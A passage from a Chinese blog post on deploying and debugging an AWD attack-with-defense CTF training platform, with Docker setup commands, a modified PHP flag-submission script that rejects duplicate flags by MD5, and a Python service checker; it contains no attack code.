web_server是靶机、2是靶机数量也是队伍数量</span><br><span class="line">python batch.py web_yunnan_simple 2</span><br><span class="line"></span><br><span class="line">2、</span><br><span class="line">运行start.py脚本，2是靶机数量，与第一步创建时相对应即可</span><br><span class="line">python start.py ./ 2</span><br><span class="line"></span><br><span class="line">3、</span><br><span class="line">启动裁判靶机（check脚本）</span><br><span class="line">先：docker attach check_server</span><br><span class="line">再：python check.py</span><br><span class="line"></span><br><span class="line">4、</span><br><span class="line">关闭所有靶机</span><br><span class="line">python stop_clean.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>本不应该存在方法二的，但是因为docker没有加速真的拉取不来镜像<br>于是我将镜像打包出来了，所以使用的时候将镜像从本地导入一次就可以使用了<br>链接：<a href="https://pan.baidu.com/s/1xkm7B9PNv5Ilu0v1vzJi9A">https://pan.baidu.com/s/1xkm7B9PNv5Ilu0v1vzJi9A</a><br>提取码：5fck</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker镜像导入命令</span><br><span class="line">二选其一应该都可以，我用了第二种</span><br><span class="line">sudo docker load &lt;　/home/ubuntu/web_14.04.tar</span><br><span class="line">sudo docker load -i /home/ubuntu/web_14.04.tar</span><br><span class="line">这里后面的路径改成对应自己文件的路径就可以了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker镜像打包命令</span><br><span class="line">sudo docker save -o quay.io-calico-node-1.tar quay.io/calico/node</span><br></pre></td></tr></table></figure><p>镜像导入后，docker images查看一下镜像名字是否为 <code>web_14.04</code><br>如果不是执行：<code>docker tag zhl2008/web_14.04 web_14.04</code></p><p>然后就可以按照方法一的结尾去启动环境了</p><h3 id="积分版页面"><a href="#积分版页面" class="headerlink" title="积分版页面"></a>积分版页面</h3><p>原版的积分版页面比较的丑，这里使用夜莫离大佬写的页面<br>将文件解压到awd-platform-master/flag_server/下，然后修改下方图示信息<br>积分版页面地址：<a href="http://ip:8080/">http://ip:8080</a><br>链接：<a href="https://pan.baidu.com/s/1lsi0G08zFHWdO1Vu_qDzBA">https://pan.baidu.com/s/1lsi0G08zFHWdO1Vu_qDzBA</a><br>提取码：epus<br><img src="/images/AWD%E6%90%AD%E5%BB%BA/1.png"></p><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>靶场本身做的还是很棒的，虽然没有炫酷的界面和攻击流量<br>但是作为一个日常训练学习的平台还是足够的</p><p>这里存在的主要bug出现在flag_server/flag_file.php文件中<br>原版的代码被我修改了找不到了，记得原版好象是基于时间判断flag提交<br>原版存在的问题是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、flag提交时间间隔必须是2分钟(自定)，即便flag刷新，间隔时间也不会刷新</span><br><span class="line">2、如果取消上述限制，会变为一个flag可以无限刷分</span><br></pre></td></tr></table></figure><p>为了解决上诉问题，我采用了读取flag文件md5的方式，判断两次提交时文件内容是否发生变化<br>下方是修改后的flag_file.php文件<br>然后需要将xxxxxxxx_flag、score.txt、time.txt文件赋予777权限</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Flag_Submit&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;assets/css/flag_file.css&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">&quot;login_frame&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;p style=<span class="string">&quot;background-color: #3BD9FF;font-size: 14px;width: 120px;height: 28px;line-height: 28px;text-align: center; color: white;border-radius: 6px;float: center; margin-top: 20px;margin-bottom: -5px&quot;</span>&gt;FLAG 提交页面&lt;/p&gt;&lt;/center&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">        &lt;p&gt;&lt;label <span class="class"><span class="keyword">class</span>=&quot;<span class="title">label_input</span>&quot;&gt;<span class="title">Token</span>:&lt;/<span class="title">label</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">token</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">Token</span>&quot; <span class="title">class</span>=&quot;<span class="title">text_field</span>&quot; <span class="title">placeholder</span>=&quot;输入自己队伍<span class="title">Token</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;&lt;<span class="title">label</span> <span class="title">class</span>=&quot;<span class="title">label_input</span>&quot;&gt;<span class="title">Flag</span> :&lt;/<span class="title">label</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">flag</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">Flag</span>&quot; <span class="title">class</span>=&quot;<span class="title">text_field</span>&quot; <span class="title">placeholder</span>=&quot;在此输入<span class="title">FLAG</span>...&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">login_control</span>&gt;</span></span><br><span class="line"><span class="class">         &lt;<span class="title">button</span> <span class="title">id</span>=&quot;<span class="title">btn_submit</span>&quot; <span class="title">value</span>=&quot;提交&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;提交&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">         &lt;<span class="title">button</span> <span class="title">id</span>=&quot;<span class="title">btn_reset</span>&quot; <span class="title">value</span>=&quot;重置&quot; <span class="title">tpye</span>=&quot;<span class="title">reset</span>&quot;&gt;重置&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    </span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">require</span> &#x27;<span class="title">config</span>.<span class="title">php</span>&#x27;;</span></span><br><span class="line"><span class="class">#<span class="title">require</span> &#x27;<span class="title">pass</span>.<span class="title">php</span>&#x27;;</span></span><br><span class="line"><span class="class">$<span class="title">now_time</span> = <span class="title">time</span>();</span></span><br><span class="line"><span class="class">$<span class="title">flag_file</span> = &#x27;<span class="title">xxxxxxxx_flag</span>&#x27;;</span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">readmd5</span>()</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag_file</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$time_file</span>;</span><br><span class="line">    <span class="variable">$readflagmd5</span> = md5_file(<span class="variable">$flag_file</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$readflagmd5</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_time</span>(<span class="params"><span class="variable">$attack_uid</span>,<span class="variable">$victim_uid</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$time_file</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$min_time_span</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$now_time</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$team_number</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$flag_file</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$time_file</span>;</span><br><span class="line">    <span class="comment">#$old_times = explode(&#x27;|&#x27; , file_get_contents($time_file));</span></span><br><span class="line">    <span class="variable">$old_times</span> = explode(<span class="string">&#x27;|&#x27;</span> , file_get_contents(<span class="variable">$time_file</span>));</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$attack_uid</span> * <span class="variable">$team_number</span> + <span class="variable">$victim_uid</span>;</span><br><span class="line"><span class="keyword">if</span> (readmd5() == <span class="variable">$old_times</span>[<span class="variable">$id</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;Error: 请不要重复提交FLAG&lt;/center&gt;&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//更新时间</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_time</span>(<span class="params"><span class="variable">$attack_uid</span>,<span class="variable">$victim_uid</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$time_file</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$now_time</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$team_number</span>;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$time_file</span>;</span><br><span class="line">    <span class="variable">$old_times</span> = explode(<span class="string">&#x27;|&#x27;</span> , file_get_contents(<span class="variable">$time_file</span>));<span class="comment">//读取time.txt文件的时间————&gt;old_times</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$attack_uid</span> * <span class="variable">$team_number</span> + <span class="variable">$victim_uid</span> ;<span class="comment">//加分*队伍数+减分————&gt;id + $victim_uid</span></span><br><span class="line">    <span class="variable">$old_times</span>[<span class="variable">$id</span>] = readmd5();<span class="comment">//  </span></span><br><span class="line">    <span class="variable">$now_times</span> = <span class="variable">$old_times</span>;<span class="comment">//  old_times————&gt;now_time</span></span><br><span class="line">    file_put_contents(<span class="variable">$time_file</span>,implode(<span class="string">&#x27;|&#x27;</span> , <span class="variable">$now_times</span>));<span class="comment">//将新时间写入文件time.txt</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match_flag</span>(<span class="params"><span class="variable">$flag</span>,<span class="variable">$flag_file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$flags</span> = explode(<span class="string">&quot;\n&quot;</span>,file_get_contents(<span class="variable">$flag_file</span>));</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$flags</span> <span class="keyword">as</span> <span class="variable">$real_flag</span>) &#123;</span><br><span class="line"><span class="variable">$tmp</span> = explode(<span class="string">&quot;:&quot;</span>,<span class="variable">$real_flag</span>);</span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$tmp</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$real_flag</span> = <span class="variable">$tmp</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$flag</span>==<span class="variable">$real_flag</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$host</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="variable">$flag</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">    <span class="comment">//$ip = isset($_REQUEST[&#x27;test_ip&#x27;])?$_REQUEST[&#x27;test_ip&#x27;]:$_SERVER[&#x27;REMOTE_ADDR&#x27;];</span></span><br><span class="line">    <span class="keyword">if</span>(!array_key_exists(<span class="variable">$token</span> , <span class="variable">$token_list</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;center&gt;Error: 请输入正确的Token值，例如team0&lt;/center&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ip</span> = match_flag(<span class="variable">$flag</span>,<span class="variable">$flag_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$ip</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;center&gt;Error: 请提交正确的FLAG&lt;/center&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$attack_id</span> = <span class="variable">$token_list</span>[<span class="variable">$token</span>];</span><br><span class="line">    <span class="variable">$victim_id</span> = <span class="variable">$ip_list</span>[<span class="variable">$ip</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$attack_id</span> === <span class="variable">$victim_id</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;center&gt;Error: 请勿提交自己的FLAG&lt;/center&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$team_number</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$scores</span>[<span class="variable">$i</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$scores</span>[<span class="variable">$attack_id</span>] = <span class="number">10</span>;</span><br><span class="line">    <span class="variable">$scores</span>[<span class="variable">$victim_id</span>] = -<span class="number">15</span>; </span><br><span class="line">    check_time(<span class="variable">$attack_id</span>,<span class="variable">$victim_id</span>);</span><br><span class="line">    <span class="variable">$score</span> = implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$scores</span>);</span><br><span class="line">    file_put_contents(<span class="string">&#x27;result.txt&#x27;</span>,<span class="variable">$user_list</span>[<span class="variable">$attack_id</span>] . <span class="string">&#x27; =&gt; &#x27;</span> . <span class="variable">$user_list</span>[<span class="variable">$victim_id</span>].<span class="string">&quot;\n&quot;</span>, FILE_APPEND);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;curl &quot;127.0.0.1/score.php?key=&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&amp;write=1&amp;score=&#x27;</span>.<span class="variable">$score</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">    system(<span class="variable">$cmd</span>);</span><br><span class="line">    update_time(<span class="variable">$attack_id</span>,<span class="variable">$victim_id</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;Error: empty token or empty target&lt;/center&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bug2：check.py脚本<br>似乎仅适用于web_yunnan_simple靶机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">sleep_time  = <span class="number">120</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> ssl </span><br><span class="line"></span><br><span class="line">my_time = <span class="string">&#x27;AAAA&#x27;</span> </span><br><span class="line">__doc__ = <span class="string">&#x27;http(method,host,port,url,data,headers)&#x27;</span></span><br><span class="line">flag_server = <span class="string">&#x27;172.17.0.1&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;744def038f39652db118a68ab34895dc&#x27;</span></span><br><span class="line">hosts = <span class="built_in">open</span>(<span class="string">&#x27;host.lists&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">user_id = [host.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>] <span class="keyword">for</span> host <span class="keyword">in</span> hosts]</span><br><span class="line">hosts = [host.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>] <span class="keyword">for</span> host <span class="keyword">in</span> hosts]</span><br><span class="line">port = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http</span>(<span class="params">method,host,port,url,data,headers</span>):</span></span><br><span class="line">    con=httplib.HTTPConnection(host,port,timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> method==<span class="string">&#x27;post&#x27;</span> <span class="keyword">or</span> method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        headers[<span class="string">&#x27;Content-Length&#x27;</span>]=<span class="built_in">len</span>(data)</span><br><span class="line">        headers[<span class="string">&#x27;Content-Type&#x27;</span>]=<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>  </span><br><span class="line">        con.request(<span class="string">&quot;POST&quot;</span>,url,data,headers=headers)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        headers[<span class="string">&#x27;Content-Length&#x27;</span>] = <span class="number">0</span>    </span><br><span class="line">        con.request(<span class="string">&quot;GET&quot;</span>,url,headers=headers)</span><br><span class="line">    res = con.getresponse()</span><br><span class="line">    <span class="keyword">if</span> res.getheader(<span class="string">&#x27;set-cookie&#x27;</span>):</span><br><span class="line">        <span class="comment">#headers[&#x27;Cookie&#x27;] = res.getheader(&#x27;set-cookie&#x27;)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> res.getheader(<span class="string">&#x27;Location&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Your 302 direct is: &quot;</span>+res.getheader(<span class="string">&#x27;Location&#x27;</span>)</span><br><span class="line">    a = res.read()</span><br><span class="line">    con.close()</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">https</span>(<span class="params">method,host,port,url,data,headers</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;https://&#x27;</span> + host + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port) + url</span><br><span class="line">    req = urllib2.Request(url,data,headers)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    <span class="keyword">return</span> response.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score</span>():</span></span><br><span class="line">    res = http(<span class="string">&#x27;get&#x27;</span>,flag_server,<span class="number">8080</span>,<span class="string">&#x27;/score.php?key=%s&#x27;</span>%key,<span class="string">&#x27;&#x27;</span>,headers)</span><br><span class="line">    <span class="built_in">print</span> res</span><br><span class="line">    user_scores = res.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;******************************************************************&quot;</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> res</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;******************************************************************&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> user_scores</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_score</span>(<span class="params">scores</span>):</span></span><br><span class="line">    scores = <span class="string">&#x27;|&#x27;</span>.join(scores)</span><br><span class="line">    res = http(<span class="string">&#x27;get&#x27;</span>,flag_server,<span class="number">8080</span>,<span class="string">&#x27;/score.php?key=%s&amp;write=1&amp;score=%s&#x27;</span>%(key,scores),<span class="string">&#x27;&#x27;</span>,headers)</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">&quot;&lt;center&gt;Success&lt;/center&gt;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:   </span><br><span class="line">        <span class="built_in">print</span> res</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check</span>():</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index_check</span>(<span class="params">self</span>):</span></span><br><span class="line">        res = http(<span class="string">&#x27;get&#x27;</span>,host,port,<span class="string">&#x27;/index.php?file=%s&#x27;</span>%<span class="built_in">str</span>(my_time),<span class="string">&#x27;&#x27;</span>,headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;perspi&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;[fail!] index_fail&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_check</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = check()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> a.index_check():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">game_round = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">    scores = get_score()</span><br><span class="line">    scores = []</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;---------------------------Check Round %d --------------------------&quot;</span>%game_round</span><br><span class="line">    <span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;-------------------------------------------------------------------&quot;</span></span><br><span class="line">        host = host[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> server_check():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Host: &quot;</span>+host+<span class="string">&quot; seems ok&quot;</span></span><br><span class="line">            scores.append(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Host: &quot;</span>+host+<span class="string">&quot; seems down&quot;</span></span><br><span class="line">            scores.append(<span class="string">&quot;-10&quot;</span>)</span><br><span class="line">    game_round += <span class="number">1</span></span><br><span class="line">    write_score(scores)</span><br><span class="line">    time.sleep(sleep_time)</span><br></pre></td></tr></table></figure><h3 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h3><p><a href="http://www.falsectf.top" 